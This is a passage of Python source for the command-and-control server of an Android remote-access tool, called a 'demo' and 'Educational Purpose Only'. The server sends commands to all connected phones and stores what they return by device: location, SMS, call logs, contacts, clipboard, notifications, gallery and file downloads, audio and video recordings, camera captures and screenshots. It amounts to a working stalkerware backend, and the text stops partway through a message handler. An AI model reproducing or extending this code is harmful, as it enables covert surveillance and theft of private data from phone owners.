#!/usr/bin/env python3
"""
Android Device Demo Server with Web GUI
Combines the socket server for Android devices and a lightweight HTTP server
for serving a browser-based GUI.

Usage:
    python3 android_demo_server_web.py
    Then open http://<server-ip>:8080 in a browser
"""

import socket
import json
import threading
import os
import time
import base64
from datetime import datetime
import signal
import sys
import traceback
import queue
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import urllib.parse

# FCM sender
try:
    from fcm_sender import FcmSender
    _fcm_service_account_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "firebase-service-account.json")
    fcm_sender = None
    if os.path.exists(_fcm_service_account_path):
        try:
            fcm_sender = FcmSender(_fcm_service_account_path)
            print(f"[+] FCM sender initialized with service account: {_fcm_service_account_path}")
        except Exception as e:
            print(f"[!] FCM sender init failed: {e}")
    else:
        print(f"[!] FCM service account not found at {_fcm_service_account_path} — push notifications disabled")
except ImportError:
    print("[!] fcm_sender module not found — push notifications disabled")
    fcm_sender = None

# Create directories for received files
RECEIVED_DIR = "received_files"
IMAGES_DIR = os.path.join(RECEIVED_DIR, "images")
AUDIO_DIR = os.path.join(RECEIVED_DIR, "audio")
VIDEO_DIR = os.path.join(RECEIVED_DIR, "videos")
DOCS_DIR = os.path.join(RECEIVED_DIR, "docs")
LOG_FILE = "device_logs.json"
HISTORY_FILE = "command_history.log"
STATS_FILE = "server_stats.json"

for d in [RECEIVED_DIR, IMAGES_DIR, AUDIO_DIR, VIDEO_DIR, DOCS_DIR]:
    os.makedirs(d, exist_ok=True)


class DeviceSession:
    """Represents a connected device session"""
    def __init__(self, session_id, address, client_socket):
        self.session_id = session_id
        self.address = address
        self.client_socket = client_socket
        self.connected = True
        self.last_heartbeat = time.time()
        self.device_info = {}
        self.device_id = None          # Will be set when we get device_info message
        self.pending_file = None  # For incoming file transfers
        self.total_images_received = 0
        self.total_screenshots_received = 0
        self.total_audio_received = 0
        self.total_videos_received = 0
        self.total_files_received = 0
        self.total_commands_processed = 0
        self.total_notifications_received = 0
        self.bytes_received = 0
        self.bytes_sent = 0
        self.notifications_buffer = []
        self.last_gallery_list = None
        self.last_file_list = None
        self.last_call_logs = None
        self.last_contacts = None
        self.last_sms_logs = None
        self.last_app_list = None
        self.last_storage_info = None
        self.last_location = None
        self.last_device_info = None
        self.last_battery_info = None
        self.last_clipboard = None
        self.fcm_token = None  # FCM registration token for push notifications


class DemoServer:
    def __init__(self, host='0.0.0.0', port=8000, log_queue=None, console_mode=True):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.sessions = {}  # device_id (string) -> DeviceSession
        self._conn_counter = 0  # internal counter for temp session_ids only
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.log_queue = log_queue  # Queue for sending log messages to GUI (if any)
        self.console_mode = console_mode  # Whether to run console loop
        self.recent_logs = []  # Keep last 100 logs for web UI
        self.stats = {
            'total_connections': 0,
            'active_connections': 0,
            'total_images': 0,
            'total_audio': 0,
            'total_videos': 0,
            'total_files': 0,
            'total_screenshots': 0,
            'total_commands': 0,
            'total_notifications': 0,
            'uptime_start': self.start_time
        }
        self.load_stats()

    def log(self, message):
        """Log message to console, file, and optionally to GUI queue"""
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        full_message = f"[{ts}] {message}"
        print(full_message)  # Console output
        self.log_to_file(message)  # File logging
        if self.log_queue and not self.console_mode:
            try:
                self.log_queue.put(full_message, block=False)
            except queue.Full:
                pass  # Drop log if queue is full (unlikely)
        # Keep recent logs for web UI (last 100)
        self.recent_logs.append(full_message)
        if len(self.recent_logs) > 100:
            self.recent_logs.pop(0)

    def log_to_file(self, data, address=None):
        try:
            existing = []
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    try:
                        existing = json.load(f)
                    except:
                        existing = []
            entry = {
                "timestamp": datetime.now().isoformat(),
                "source_ip": address[0] if address else "localhost",
                "source_port": address[1] if address else 0,
                "data": data
            }
            existing.append(entry)
            with open(LOG_FILE, 'w') as f:
                json.dump(existing, f, indent=2)
        except Exception as e:
            self.log(f"[!] Failed to log to file: {e}")

    def log_command(self, command, session_id, result="sent"):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(HISTORY_FILE, 'a') as f:
            f.write(f"[{ts}] Session {session_id} | Command: {command} | Result: {result}\n")

    def update_stats(self):
        with self.lock:
            self.stats['active_connections'] = len([s for s in self.sessions.values() if s.connected])
            self.stats['total_images'] = sum(s.total_images_received for s in self.sessions.values())
            self.stats['total_screenshots'] = sum(s.total_screenshots_received for s in self.sessions.values())
            self.stats['total_audio'] = sum(s.total_audio_received for s in self.sessions.values())
            self.stats['total_videos'] = sum(s.total_videos_received for s in self.sessions.values())
            self.stats['total_files'] = sum(s.total_files_received for s in self.sessions.values())
            self.stats['total_commands'] = sum(s.total_commands_processed for s in self.sessions.values())
            self.stats['total_notifications'] = sum(s.total_notifications_received for s in self.sessions.values())
            self.stats['uptime'] = time.time() - self.start_time

    def save_stats(self):
        try:
            self.update_stats()
            with open(STATS_FILE, 'w') as f:
                json.dump(self.stats, f, indent=2)
        except Exception as e:
            self.log(f"[!] Failed to save stats: {e}")

    def load_stats(self):
        try:
            if os.path.exists(STATS_FILE):
                with open(STATS_FILE, 'r') as f:
                    self.stats = json.load(f)
        except Exception as e:
            self.log(f"[!] Failed to load stats: {e}")
            self.stats = {
                'total_connections': 0,
                'active_connections': 0,
                'total_images': 0,
                'total_audio': 0,
                'total_videos': 0,
                'total_files': 0,
                'total_commands': 0,
                'total_notifications': 0,
                'uptime_start': time.time()
            }

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            self.running = True

            self.log("=" * 60)
            self.log("  ANDROID DEVICE DEMO SERVER - VERSION 5.1 WITH WEB GUI")
            self.log("  Educational Purpose Only")
            self.log("=" * 60)
            self.log(f"[+] Socket server listening on {self.host}:{self.port}")
            self.log(f"[+] Files saved to: {os.path.abspath(RECEIVED_DIR)}/")
            self.log(f"[+] Images: {IMAGES_DIR}")
            self.log(f"[+] Audio:  {AUDIO_DIR}")
            self.log(f"[+] Video:  {VIDEO_DIR}")
            self.log(f"[+] Docs:   {DOCS_DIR}")
            self.log("=" * 60)
            if self.console_mode:
                self.show_help()
            self.log("=" * 60)

            # Start console command thread only if in console mode
            if self.console_mode:
                console_thread = threading.Thread(target=self.console_loop, daemon=True)
                console_thread.start()

            # Start heartbeat monitor thread
            heartbeat_thread = threading.Thread(target=self.heartbeat_monitor, daemon=True)
            heartbeat_thread.start()

            # Start stats save thread
            stats_thread = threading.Thread(target=self.stats_save_loop, daemon=True)
            stats_thread.start()

            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    with self.lock:
                        self._conn_counter += 1
                        session_id = self._conn_counter
                    session = DeviceSession(session_id, address, client_socket)
                    self.stats['total_connections'] = self._conn_counter
                    # Do NOT add to self.sessions yet — device_id unknown until device_info arrives

                    self.log(f"[+] New connection #{session_id} from {address[0]}:{address[1]}")
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(session,)
                    )
                    client_thread.daemon = True
                    client_thread.start()

                except OSError:
                    if self.running:
                        self.log("[!] Accept error")
                    break

        except Exception as e:
            self.log(f"[!] Error starting server: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()
            self.save_stats()

    def stats_save_loop(self):
        """Periodically save stats"""
        while self.running:
            time.sleep(30)
            self.save_stats()

    def heartbeat_monitor(self):
        """Monitor device heartbeats and mark stale sessions"""
        while self.running:
            time.sleep(10)
            current = time.time()
            with self.lock:
                for sid, session in list(self.sessions.items()):
                    if session.connected and (current - session.last_heartbeat) > 120:
                        self.log(f"[!] Session {sid} ({session.address[0]}) timed out")
                        session.connected = False
                        try:
                            session.client_socket.close()
                        except:
                            pass

    def console_loop(self):
        """Server console for sending commands to devices"""
        while self.running:
            try:
                cmd = input("\n> ").strip()
                if not cmd:
                    continue

                parts = cmd.split()
                command = parts[0].lower()

                if command == "quit" or command == "exit":
                    self.log("[!] Shutting down server...")
                    self.running = False
                    try:
                        self.server_socket.close()
                    except:
                        pass
                    break

                elif command == "help":
                    self.show_help()

                elif command == "list_devices":
                    self.list_devices()

                elif command == "stats":
                    self.show_stats()

                elif command == "send":
                    # send <command> [json_args]
                    if len(parts) < 2:
                        print("Usage: send <command> [json_args]")
                        continue
                    custom_cmd = parts[1]
                    args_json = ""
                    if len(parts) > 2:
                        args_json = " ".join(parts[2:])
                    self.send_command_to_all(custom_cmd, args_json)

                # === v2.0/v3.0 Commands ===
                elif command in ["get_location",
                                 "record_audio", "get_app_list",
                                 "get_device_info", "heartbeat",
                                 "capture_front", "capture_back"]:
                    self.send_command_to_all(command)

                # === v5.0 Gallery Commands ===
                elif command == "get_gallery_list":
                    self.send_command_to_all("get_gallery_list")

                elif command == "download_gallery_item":
                    if len(parts) < 2:
                        print("Usage: download_gallery_item <item_id>")
                        continue
                    args = json.dumps({"item_id": parts[1]})
                    self.send_command_to_all("download_gallery_item", args)

                elif command == "download_gallery":
                    # Download ALL gallery items
                    self.send_command_to_all("download_gallery")

                elif command == "get_file_list":
                    self.send_command_to_all("get_file_list")

                # === v4.0 NEW Commands ===
                elif command == "get_call_logs":
                    self.send_command_to_all("get_call_logs")

                elif command == "get_contacts":
                    self.send_command_to_all("get_contacts")

                elif command == "list_files":
                    # list_files [path]
                    path = ""
                    if len(parts) > 1:
                        path = parts[1]
                    args = json.dumps({"path": path})
                    self.send_command_to_all("list_files", args)

                elif command == "get_storage_info":
                    self.send_command_to_all("get_storage_info")

                elif command == "download_file":
                    if len(parts) < 2:
                        print("Usage: download_file <path>")
                        continue
                    args = json.dumps({"path": parts[1]})
                    self.send_command_to_all("download_file", args)

                elif command == "record_video":
                    # record_video [duration_sec] [front|back]
                    duration = 10
                    front = False
                    if len(parts) > 1:
                        try:
                            duration = int(parts[1])
                        except:
                            pass
                    if len(parts) > 2 and parts[2].lower() == "front":
                        front = True
                    args = json.dumps({"duration": duration, "front": front})
                    self.send_command_to_all("record_video", args)

                elif command == "get_notifications":
                    self.send_command_to_all("get_notifications")

                elif command == "get_sms_logs":
                    self.send_command_to_all("get_sms_logs")

                elif command == "screenshot":
                    self.send_command_to_all("screenshot")

                elif command == "get_battery_info":
                    self.send_command_to_all("get_battery_info")

                elif command == "get_clipboard":
                    self.send_command_to_all("get_clipboard")

                else:
                    print(f"Unknown command: {command}. Type 'help' for available commands.")

            except EOFError:
                break
            except Exception as e:
                self.log(f"[!] Console error: {e}")

    def show_help(self):
        """Show available commands"""
        print("\n" + "=" * 60)
        print("  ANDROID DEVICE DEMO SERVER v5.1 - AVAILABLE COMMANDS")
        print("=" * 60)
        print("\n  --- v2.0/v3.0 Commands ---")
        print("  1.  get_location       - Request GPS coordinates")
        print("  2.  record_audio       - Request 5s audio recording")
        print("  3.  get_app_list       - Request installed apps list")
        print("  4.  get_device_info    - Request device information")
        print("  5.  capture_front      - Front camera (app must be foreground)")
        print("  6.  capture_back       - Rear camera (app must be foreground)")
        print("\n  --- v5.0 Gallery Commands ---")
        print("  7.  get_gallery_list   - List gallery items with IDs")
        print("  8.  download_gallery_item <id> - Download specific item")
        print("  9.  download_gallery   - Download ALL gallery items (max 50)")
        print("  10. get_file_list      - Get gallery list (deprecated)")
        print("\n  --- v4.0 Commands ---")
        print("  11. get_call_logs      - Request device call history")
        print("  12. get_contacts       - Request contacts list")
        print("  13. list_files [path]  - Browse device filesystem")
        print("  14. get_storage_info   - Get device storage info")
        print("  15. download_file <path> - Download specific file")
        print("  16. record_video [s] [front|back] - Record video clip")
        print("  17. get_notifications  - Get recent notifications")
        print("\n  --- v5.1 NEW ---")
        print("  18. get_sms_logs       - Get SMS/inbox messages")
        print("\n  --- v6.0 NEW ---")
        print("  19. get_battery_info   - Get battery status and health")
        print("  20. get_clipboard      - Get current clipboard content")
        print("  21. screenshot         - Capture device screenshot (requires user prompt)")
        print("\n  --- Server Commands ---")
        print("  19. list_devices       - Show connected devices")
        print("  20. stats              - Show server statistics")
        print("  21. send <cmd> [json]  - Send custom command with args")
        print("  22. help               - Show this help")
        print("  23. quit               - Stop server")
        print("=" * 60)

    def show_stats(self):
        """Show server statistics"""
        self.update_stats()
        print("\n" + "=" * 60)
        print("  SERVER STATISTICS v5.1")
        print("=" * 60)
        uptime = self.stats.get('uptime', 0)
        print(f"  Uptime: {uptime:.0f}s ({uptime/3600:.1f}h)")
        print(f"  Total Connections:     {self.stats['total_connections']}")
        print(f"  Active Connections:    {self.stats['active_connections']}")
        print(f"  Total Images:          {self.stats['total_images']}")
        print(f"  Total Audio Clips:     {self.stats['total_audio']}")
        print(f"  Total Videos:          {self.stats['total_videos']}")
        print(f"  Total Files Downloaded:{self.stats['total_files']}")
        print(f"  Total Commands:        {self.stats['total_commands']}")
        print(f"  Total Notifications:   {self.stats['total_notifications']}")
        print("=" * 60)

    def list_devices(self):
        """List all connected devices"""
        with self.lock:
            if not self.sessions:
                print("\n  No devices connected.")
                return
            print(f"\n  Connected Devices ({len(self.sessions)}):")
            print("  " + "-" * 90)
            print(f"  {'ID':<4} | {'IP':<15} | {'Model':<20} | {'Status':<8} | {'Img':<4} | {'Vid':<4} | {'Notif':<6}")
            print("  " + "-" * 90)
            for device_id, session in self.sessions.items():
                status = "ONLINE" if session.connected else "OFFLINE"
                ip = session.address[0]
                model = session.device_info.get('model', 'Unknown')[:20]
                print(f"  {device_id[:16]:<16} | {ip:<15} | {model:<20} | {status:<8} | "
                      f"{session.total_images_received:<4} | {session.total_videos_received:<4} | {session.total_notifications_received:<6}")
            print("  " + "-" * 90)

    def send_command_to_all(self, command, args_json=""):
        """Send command to all connected devices"""
        sent = 0
        with self.lock:
            sessions = list(self.sessions.values())
        for session in sessions:
            if session.connected:
                self.send_command(session, command, args_json)
                self.log_command(command, session.session_id)
                sent += 1
        self.log(f"[+] Command '{command}' sent to {sent} device(s)")

    def send_command(self, session, command, args_json=""):
        """Send a command to a specific device session"""
        try:
            msg_dict = {"type": "command", "command": command}
            if args_json:
                try:
                    args = json.loads(args_json)
                    msg_dict.update(args)
                except:
                    pass
            msg = json.dumps(msg_dict).encode('utf-8')
            session.client_socket.send(msg)
            with self.lock:
                session.bytes_sent += len(msg)
                session.total_commands_processed += 1
        except Exception as e:
            self.log(f"[!] Failed to send command to session {session.session_id}: {e}")
            session.connected = False

    def handle_client(self, session):
        """Handle individual client connection"""
        try:
            remainder = b""
            while self.running and session.connected:
                try:
                    data = session.client_socket.recv(65536)
                    if not data:
                        break

                    with self.lock:
                        session.bytes_received += len(data)

                    combined = remainder + data
                    remainder = b""

                    idx = 0
                    while idx < len(combined):
                        pending = session.pending_file
                        if pending:
                            # We are receiving a binary file
                            total_needed = pending["size"]
                            current_have = len(pending["data"])
                            remaining_needed = total_needed - current_have

                            chunk = combined[idx : idx + remaining_needed]
                            pending["data"] += chunk
                            idx += len(chunk)

                            if len(pending["data"]) >= total_needed:
                                # File complete!
                                device_id = session.device_id if session.device_id else "unknown"
                                file_type = pending.get("file_type", "image")
                                if file_type == "image":
                                    save_dir = os.path.join(IMAGES_DIR, device_id)
                                elif file_type == "audio":
                                    save_dir = os.path.join(AUDIO_DIR, device_id)
                                elif file_type == "video":
                                    save_dir = os.path.join(VIDEO_DIR, device_id)
                                else:
                                    save_dir = os.path.join(DOCS_DIR, device_id)
                                os.makedirs(save_dir, exist_ok=True)

                                filename = pending["filename"]
                                filepath = os.path.join(save_dir, filename)

                                with open(filepath, 'wb') as f:
                                    f.write(pending["data"])

                                self.log(f"[+] File saved: {filepath} ({len(pending['data'])} bytes)")
                                with self.lock:
                                    if file_type == "image":
                                        session.total_images_received += 1
                                    elif file_type == "audio":
                                        session.total_audio_received += 1
                                    elif file_type == "video":
                                        session.total_videos_received += 1
                                    else:
                                        session.total_files_received += 1

                                # Send acknowledgment
                                ack = json.dumps({
                                    "type": "ack",
                                    "message": "file_received",
                                    "filename": filename
                                }).encode('utf-8')
                                try:
                                    session.client_socket.send(ack)
                                except (BrokenPipeError, ConnectionResetError, OSError):
                                    self.log(f"[!] Failed to send file ack to session {session.session_id}")
                                    session.connected = False
                                session.pending_file = None
                        else:
                            # We are expecting JSON - try to decode one message
                            try:
                                chunk_str = combined[idx:].decode('utf-8')
                                decoder = json.JSONDecoder()
                                message, end_pos = decoder.raw_decode(chunk_str)

                                # Process JSON message
                                self.handle_json_message(session, message)

                                # Move idx forward by the byte length of the parsed JSON
                                json_bytes_len = len(chunk_str[:end_pos].encode('utf-8'))
                                idx += json_bytes_len
                            except json.JSONDecodeError:
                                # Incomplete JSON - save remainder, wait for more data
                                remainder = combined[idx:]
                                idx = len(combined)
                            except UnicodeDecodeError:
                                # Binary data where we expected JSON - this means
                                # a file_transfer_start was received but pending_file
                                # wasn't set (race or missed). Treat remaining bytes
                                # as raw and re-process on next recv.
                                remainder = combined[idx:]
                                idx = len(combined)
                except ConnectionResetError:
                    break
                except Exception as e:
                    self.log(f"[!] Session {session.session_id} error: {e}")
                    traceback.print_exc()
                    break

        except Exception as e:
            self.log(f"[!] Handler error: {e}")
        finally:
            session.connected = False
            try:
                session.client_socket.close()
            except:
                pass
            self.log(f"[-] Session {session.session_id} ({session.address[0]}) disconnected")

    def handle_json_message(self, session, message):
        """Handle incoming JSON messages"""
        msg_type = message.get("type", "info")

        if msg_type == "heartbeat":
            session.last_heartbeat = time.time()
            self.log(f"[♥] Heartbeat from session {session.session_id} ({session.address[0]})")

        elif msg_type == "device_info":
            device_info = message.get("device_info", {})
            session.device_info = device_info
            session.last_device_info = message
            session.device_id = device_info.get("device_id")
            session.last_heartbeat = time.time()

            # Register session by device_id — replace old session if same device reconnects
            with self.lock:
                if session.device_id and session.device_id in self.sessions:
                    old = self.sessions[session.device_id]
                    if old.connected:
                        try:
                            old.client_socket.shutdown(socket.SHUT_RDWR)
                        except:
                            pass
                        try:
                            old.client_socket.close()
                        except:
                            pass
                    old.connected = False
                    # Copy counters from old session to new session (preserve cumulative stats)
                    session.total_images_received += old.total_images_received
                    session.total_screenshots_received += old.total_screenshots_received
                    session.total_audio_received += old.total_audio_received
                    session.total_videos_received += old.total_videos_received
                    session.total_files_received += old.total_files_received
                    session.total_notifications_received += old.total_notifications_received
                    session.total_commands_processed += old.total_commands_processed
                    # Replace old session with new one
                    self.sessions[session.device_id] = session
                    self.log(f"[+] Device {session.device_id} reconnected — replaced old session #{old.session_id} with #{session.session_id}")
                elif session.device_id:
                    # New device
                    self.sessions[session.device_id] = session

            info = session.device_info
            self.log(f"[i] Device info from session {session.session_id}:")
            self.log(f"    Model: {info.get('model', 'Unknown')}")
            self.log(f"    Android: {info.get('android_version', 'Unknown')}")
            self.log(f"    App Version: {info.get('app_version', 'Unknown')}")
            self.log(f"    Emulator: {info.get('is_emulator', 'Unknown')}")
            self.log(f"    Device ID: {info.get('device_id', 'Unknown')}")
            perms = message.get("permissions", [])
            self.log(f"    Permissions granted: {len(perms)}")
            self.log_to_file(message, session.address)

        elif msg_type == "location":
            lat = message.get("latitude", "Unknown")
            lon = message.get("longitude", "Unknown")
            acc = message.get("accuracy", "Unknown")
            # Save location to file (per-device)
            device_id = session.device_id if session.device_id else "unknown"
            loc_dir = os.path.join(DOCS_DIR, device_id)
            os.makedirs(loc_dir, exist_ok=True)
            loc_file = os.path.join(loc_dir, f"location_{session.session_id}_{int(time.time())}.json")
            with open(loc_file, 'w') as f:
                json.dump(message, f, indent=2)
            self.log(f"[i] Location saved to: {loc_file}")
            session.last_location = message
            self.log(f"[i] Location from session {session.session_id}:")
            self.log(f"    Latitude: {lat}")
            self.log(f"    Longitude: {lon}")
            self.log(f"    Accuracy: {acc}m")
            self.log_to_file(message, session.address)

        elif msg_type == "gallery_list":
            files = message.get("files", [])
            session.last_gallery_list = files
            self.log(f"[i] Gallery file list from session {session.session_id} ({len(files)} items):")
            for f in files[:20]:
                if isinstance(f, dict):
                    self.log(f"    - [{f.get('id', '?')}] {f.get('name', '?')} ({f.get('size', 0)} bytes)")
                else:
                    self.log(f"    - {f}")
            if len(files) > 20:
                self.log(f"    ... and {len(files) - 20} more")
            # Save gallery list to file (per-device)
            device_id = session.device_id if session.device_id else "unknown"
            docs_dir = os.path.join(DOCS_DIR, device_id)
            os.makedirs(docs_dir, exist_ok=True)
            gallery_file = os.path.join(docs_dir, f"gallery_list_{session.session_id}_{int(time.time())}.json")
            with open(gallery_file, 'w') as f:
                json.dump(files, f, indent=2)
            self.log(f"    [+] Saved to: {gallery_file}")
            self.log_to_file(message, session.address)

        elif msg_type == "file_list_legacy":
            # Legacy format: simple string array (old get_file_list command)
            files = message.get("files", [])
            session.last_gallery_list = files
            self.log(f"[i] Gallery file list (legacy) from session {session.session_id} ({len(files)} files):")
            for f in files[:20]:
                self.log(f"    - {f}")
            if len(files) > 20:
                self.log(f"    ... and {len(files) - 20} more")
            self.log_to_file(message, session.address)

        elif msg_type == "app_list":
            apps = message.get("apps", [])
            # Save app list to file (per-device)
            device_id = session.device_id if session.device_id else "unknown"
            app_dir = os.path.join(DOCS_DIR, device_id)
            os.makedirs(app_dir, exist_ok=True)
            app_file = os.path.join(app_dir, f"app_list_{session.session_id}_{int(time.time())}.json")
            with open(app_file, 'w') as f:
                json.dump(apps, f, indent=2)
            self.log(f"[i] App list saved to: {app_file}")
            session.last_app_list = apps
            self.log(f"[i] Installed apps from session {session.session_id} ({len(apps)} apps):")
            for app in apps[:15]:
                self.log(f"    - {app}")
            if len(apps) > 15:
                self.log(f"    ... and {len(apps) - 15} more")
            self.log_to_file(message, session.address)

        elif msg_type == "file_transfer_start":
            filename = message.get("filename", "unknown")
            file_size = message.get("size", 0)
            file_type = message.get("file_type", "image")
            session.pending_file = {
                "filename": filename,
                "size": file_size,
                "type": file_type,
                "data": b""
            }
            self.log(f"[i] Receiving file from session {session.session_id}:")
            self.log(f"    Name: {filename}")
            self.log(f"    Size: {file_size} bytes")
            self.log(f"    Type: {file_type}")

            ack = json.dumps({"type": "ack", "message": "ready_to_receive"}).encode('utf-8')
            try:
                session.client_socket.send(ack)
                with self.lock:
                    session.bytes_sent += len(ack)
            except (BrokenPipeError, ConnectionResetError, OSError):
                self.log(f"[!] Failed to send ack to session {session.session_id}")
                session.connected = False

        elif msg_type == "file_transfer_complete":
            self.log(f"[+] File transfer complete from session {session.session_id}")
            self.log_to_file(message, session.address)

        elif msg_type == "command_response":
            cmd = message.get("command", "unknown")
            status = message.get("status", "unknown")
            payload = message.get("payload", {})
            self.log(f"[i] Command response from session {session.session_id}:")
            self.log(f"    Command: {cmd}")
            self.log(f"    Status: {status}")
            if payload:
                self.log(f"    Payload: {json.dumps(payload)}")
            self.log_command(cmd, session.session_id, f"response: {status}")
            self.log_to_file(message, session.address)

        elif msg_type == "audio_data":
            audio_b64 = message.get("data", "")
            if audio_b64:
                audio_bytes = base64.b64decode(audio_b64)
                filename = f"audio_{int(time.time())}.3gp"
                # Save in audio directory under device ID
                device_id = session.device_id if session.device_id else "unknown"
                audio_dir = os.path.join(AUDIO_DIR, device_id)
                os.makedirs(audio_dir, exist_ok=True)
                filepath = os.path.join(audio_dir, filename)
                with open(filepath, 'wb') as f:
                    f.write(audio_bytes)
                self.log(f"[+] Audio saved: {filepath} ({len(audio_bytes)} bytes)")
                with self.lock:
                    session.total_audio_received += 1
            self.log_to_file(message, session.address)

        elif msg_type == "screenshot_data":
            # Handle screenshot image data (sent as base64 in a single JSON message)
            image_b64 = message.get("data", "")
            if image_b64:
                try:
                    image_bytes = base64.b64decode(image_b64)
                    timestamp = int(time.time())
                    # Use filename from client if provided, otherwise generate one
                    filename = message.get("filename", f"screenshot_{session.session_id}_{timestamp}.jpg")
                    # Save in screenshots directory under device ID
                    screenshot_dir = os.path.join(RECEIVED_DIR, "screenshots", session.device_id if session.device_id else "unknown")
                    os.makedirs(screenshot_dir, exist_ok=True)
                    filepath = os.path.join(screenshot_dir, filename)
                    with open(filepath, 'wb') as f:
                        f.write(image_bytes)
                    self.log(f"[+] Screenshot saved: {filepath} ({len(image_bytes)} bytes)")
                    with self.lock:
                        session.total_screenshots_received += 1
                        session.total_images_received += 1
                    self.log_to_file(message, session.address)
                except Exception as e:
                    self.log(f"[!] Failed to process screenshot: {e}")

        # === v6.0 Battery Info ===
        elif msg_type == "battery_info":
            percent = message.get("percent", "?")
            status = message.get("status", "?")
            plugged = message.get("plugged", "?")
            temp = message.get("temperature", "?")
            voltage = message.get("voltage", "?")
            health = message.get("health", "?")
            session.last_battery_info = message
            self.log(f"[i] Battery info from session {session.session_id}:")
            self.log(f"    Level: {percent}%")
            self.log(f"    Status: {status}")
            self.log(f"    Plugged: {plugged}")
            self.log(f"    Temperature: {temp}°C")
            self.log(f"    Voltage: {voltage}V")
            self.log(f"    Health: {health}")
            self.log_to_file(message, session.address)

        # === v6.0 Clipboard ===
        elif msg_type == "clipboard":
            text = message.get("text", "")
            note = message.get("note", "")
            session.last_clipboard = message
            self.log(f"[i] Clipboard from session {session.session_id}:")
            if text:
                display = text[:100] + ("..." if len(text) > 100 else "")
                self.log(f"    Content: {display}")
            else:
                self.log(f"    Content: (empty)")
            if note:
                self.log(f"    Note: {note}")
            self.log_to_file(message, session.address)

        # === v4.0 NEW MESSAGE HANDLERS ===

        elif msg_type == "call_logs":
            calls = message.get("calls", [])
            count = message.get("count", 0)
            self.log(f"[i] Call logs from session {session.session_id} ({count} calls):")
            for call in calls[:20]:
                call_type = call.get("type", 0)
                type_str = {1: "INCOMING", 2: "OUTGOING", 3: "MISSED", 4: "VOICEMAIL", 5: "REJECTED", 6: "BLOCKED"}.get(call_type, "UNKNOWN")
                self.log(f"    [{type_str}] {call.get('name', 'Unknown')} - {call.get('number', '?')} ({call.get('duration_sec', 0)}s)")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            # Save to file
            calllog_file = os.path.join(DOCS_DIR, session.device_id if session.device_id else "unknown", f"call_logs_{session.session_id}_{int(time.time())}.json")
            os.makedirs(os.path.dirname(calllog_file), exist_ok=True)
            with open(calllog_file, 'w') as f:
                json.dump(calls, f, indent=2)
            self.log(f"    [+] Saved to: {calllog_file}")
            session.last_call_logs = calls
            self.log_to_file(message, session.address)

        elif msg_type == "contacts":
            contacts = message.get("contacts", [])
            count = message.get("count", 0)
            self.log(f"[i] Contacts from session {session.session_id} ({count} contacts):")
            for contact in contacts[:20]:
                name = contact.get("name", "Unknown")
                phones = contact.get("phones", [])
                phone_str = ", ".join(str(p) if isinstance(p, str) else p.get("number", "") for p in phones)
                self.log(f"    - {name}: {phone_str}")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            # Save to file
            contacts_file = os.path.join(DOCS_DIR, session.device_id if session.device_id else "unknown", f"contacts_{session.session_id}_{int(time.time())}.json")
            os.makedirs(os.path.dirname(contacts_file), exist_ok=True)
            with open(contacts_file, 'w') as f:
                json.dump(contacts, f, indent=2)
            self.log(f"    [+] Saved to: {contacts_file}")
            session.last_contacts = contacts
            self.log_to_file(message, session.address)

        elif msg_type == "sms_logs":
            sms_list = message.get("sms", [])
            count = message.get("count", 0)
            self.log(f"[i] SMS logs from session {session.session_id} ({count} messages):")
            for sms in sms_list[:20]:
                from_num = sms.get("from", "?")
                body = sms.get("body", "")[:60]
                msg_type_map = {1: "INBOX", 2: "SENT", 3: "DRAFT", 4: "OUTBOX"}
                sms_type = msg_type_map.get(sms.get("type", 1), "UNKNOWN")
                self.log(f"    [{sms_type}] {from_num}: {body}...")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            # Save to file (per-device)
            device_id = session.device_id if session.device_id else "unknown"
            sms_dir = os.path.join(DOCS_DIR, device_id)
            os.makedirs(sms_dir, exist_ok=True)
            sms_file = os.path.join(sms_dir, f"sms_logs_{session.session_id}_{int(time.time())}.json")
            with open(sms_file, 'w') as f:
                json.dump(sms_list, f, indent=2)
            self.log(f"    [+] Saved to: {sms_file}")
            session.last_sms_logs = sms_list
            self.log_to_file(message, session.address)

        elif msg_type == "file_list":
            # File browser results (from list_files command)
            files = message.get("files", [])
            path = message.get("path", "")
            count = message.get("count", 0)
            self.log(f"[i] File browser from session {session.session_id} - Path: {path} ({count} items):")
            for f in files[:20]:
                if isinstance(f, dict):
                    self.log(f"    - [{f.get('id', '?')}] {f.get('name', '?')} ({f.get('size', 0)} bytes)")
                else:
                    self.log(f"    - {f}")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            # Save to file (per-device)
            device_id = session.device_id if session.device_id else "unknown"
            docs_dir = os.path.join(DOCS_DIR, device_id)
            os.makedirs(docs_dir, exist_ok=True)
            filelist_file = os.path.join(docs_dir, f"filelist_{session.session_id}_{int(time.time())}.json")
            with open(filelist_file, 'w') as f:
                json.dump(files, f, indent=2)
            self.log(f"    [+] Saved to: {filelist_file}")
            session.last_file_list = files
            self.log_to_file(message, session.address)

        elif msg_type == "storage_info":
            self.log(f"[i] Storage info from session {session.session_id}:")
            self.log(f"    Total: {message.get('total_gb', '?')} GB")
            self.log(f"    Free:  {message.get('free_gb', '?')} GB")
            self.log(f"    Used:  {message.get('used_percent', '?')}%")
            session.last_storage_info = message
            self.log_to_file(message, session.address)

        elif msg_type == "notification":
            notif = message.get("notification", {})
            package = notif.get("package", "Unknown")
            title = notif.get("title", "")
            text = notif.get("text", "")
            self.log(f"[📬] Notification from {package}:")
            self.log(f"     Title: {title}")
            self.log(f"     Text: {text}")
            with self.lock:
                session.total_notifications_received += 1
                session.notifications_buffer.append(notif)
            self.log_to_file(message, session.address)

        elif msg_type == "active_notifications":
            notifications = message.get("notifications", [])
